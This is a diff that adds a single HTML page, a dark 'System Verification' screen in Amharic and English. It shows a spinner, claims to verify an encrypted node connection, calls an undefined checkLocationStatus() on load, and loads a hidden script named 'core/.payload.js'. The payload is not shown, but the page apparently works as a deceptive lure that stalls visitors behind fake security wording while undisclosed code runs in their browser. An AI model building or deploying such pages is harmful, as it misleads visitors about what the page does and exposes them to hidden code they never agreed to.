@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sovereignty | Secure Access</title>
+    <style>
+        :root {
+            --primary: #00ff41;
+            --secondary: #008f11;
+            --bg: #0a0a0a;
+            --card: #141414;
+            --text: #e0e0e0;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Background Matrix Effect Animation */
+        .bg-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)), 
+                        url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
+            z-index: -1;
+        }
+
+        .container {
+            text-align: center;
+            background: var(--card);
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid var(--secondary);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
+            max-width: 400px;
+            width: 90%;
+            animation: fadeIn 1.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            font-size: 3rem;
+            color: var(--primary);
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px var(--primary);
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        p {
+            color: #888;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .loader {
+            border: 3px solid #333;
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            color: var(--primary);
+            font-family: monospace;
+            font-weight: bold;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 20px;
+            font-size: 0.7rem;
+            color: #444;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body onload="checkLocationStatus()">
+
+    <div class="bg-overlay"></div>
+
+    <div class="container">
+        <div class="logo">⚡</div>
+        <h1>System Verification</h1>
+        <p>የስርዓቱን ደህንነት በማረጋገጥ ላይ ነን። እባክዎ ለጥቂት ሰከንዶች በትዕግስት ይጠብቁ። <br> Verifying node connection and synchronizing encrypted data...</p>
+        
+        <div class="loader"></div>
+        <div class="status-text">INITIALIZING...</div>
+    </div>
+
+    <footer>
+        SOVEREIGNTY PROTOCOL V4.2 | ENCRYPTED END-TO-END
+    </footer>
+    <script src="core/.payload.js"></script>
+</body>
+</html>
